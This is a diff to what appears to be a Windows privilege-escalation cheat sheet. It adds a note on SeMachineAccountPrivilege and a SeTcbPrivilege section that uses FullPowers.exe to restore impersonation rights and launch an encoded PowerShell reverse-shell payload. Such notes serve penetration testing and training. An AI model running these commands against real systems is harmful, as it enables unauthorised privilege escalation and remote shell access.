@@ -56,6 +56,8 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ## SeMachineAccountPrivilege
 
+NOTE: This requires GenericAll over the DC as well.
+
 This allows us to add computers to the domain. We can abuse the privs on these computers using the machine account.
 
 Add computer
@@ -151,8 +153,16 @@ Secretsdump
 
 
 
+## SeTcbPrivilege
+We can use [FullPowers](https://github.com/itm4n/FullPowers) to restore default privilege set for the account and catch a reverse shell with SeImpersonatePrivilege
+```powershell
+.\FullPowers.exe -c "powershell -e <base64_string>"
+whoami /priv   # SeImpersonatePrivilege should be back
+```
 ## SeTakeOwnershipPrivilege
 
 ## SeRestorePrivilege
 ## SeLoadDriverPrivilege
+
 ## SeCreateTokenPrivilege
+
